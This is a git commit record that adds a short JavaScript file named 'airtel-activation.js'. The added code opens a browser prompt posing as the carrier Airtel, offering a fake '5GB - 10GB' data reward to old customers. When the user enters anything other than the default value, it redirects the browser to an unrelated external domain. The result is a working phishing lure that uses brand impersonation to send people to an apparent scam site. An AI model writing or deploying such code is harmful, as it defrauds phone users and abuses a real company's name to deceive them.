301f55005bf83870ac923e20422807eae5cc0682
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-04 01:13:06 -0700

    Update and rename davidoview.js to airtel-activation.js

---
+++ airtel-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Airtel: Dear customer, kindly check if your sim card is qualify for the Airtel 5GB - 10GB old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/mofaya';
+}
